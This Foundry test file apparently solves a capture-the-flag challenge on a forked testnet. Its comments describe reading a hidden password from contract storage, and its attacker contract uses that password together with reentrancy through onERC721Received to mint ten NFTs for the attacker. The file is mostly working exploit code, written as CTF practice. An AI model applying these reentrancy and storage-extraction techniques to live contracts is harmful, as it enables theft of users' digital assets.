// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "../src/GoldNFT.sol";
import "lib/openzeppelin-contracts/contracts/token/ERC721/IERC721Receiver.sol";

contract HackNFT is Test {
    GoldNFT nft;
    HackGoldNft nftHack;
    address owner = makeAddr("owner");
    address hacker = makeAddr("hacker");

    function setUp() external {
        vm.createSelectFork("<goerli>", 8591866);
        nft = new GoldNFT();
    }

    function test_Attack() public {
        vm.startPrank(hacker);
        // solution
        // decompile the bytecode, and running it trough per step with https://www.evm.codes/,
        // it can be seen that the password is set on storage slot keccak256(deployer address)
        // the deployer address is 0x302ff1c5f7e264b792876b9456f42de8df299863, make it 32 bytes hex 000000000000000000000000302ff1c5f7e264b792876b9456f42de8df299863
        // then hash it, and got 0x23ee4bc3b6ce4736bb2c0004c972ddcbe5c9795964cdd6351dadba79a295f5fe
        nftHack = new HackGoldNft(nft, hacker);
        nftHack.attack();

        assertEq(nft.balanceOf(hacker), 10);
    }
}

contract HackGoldNft {
    GoldNFT nft;
    address owner;
    uint received;

    constructor(GoldNFT _nft, address _owner) {
        nft = _nft;
        owner = _owner;
    }

    function attack() public {
        nft.takeONEnft(
            0x23ee4bc3b6ce4736bb2c0004c972ddcbe5c9795964cdd6351dadba79a295f5fe
        );
        for (uint i = 0; i < 10; i++) {
            nft.transferFrom(address(this), owner, i + 1);
        }
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        received++;
        if (received < 10) {
            nft.takeONEnft(
                0x23ee4bc3b6ce4736bb2c0004c972ddcbe5c9795964cdd6351dadba79a295f5fe
            );
        } else {
            // enough and do nothing
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}
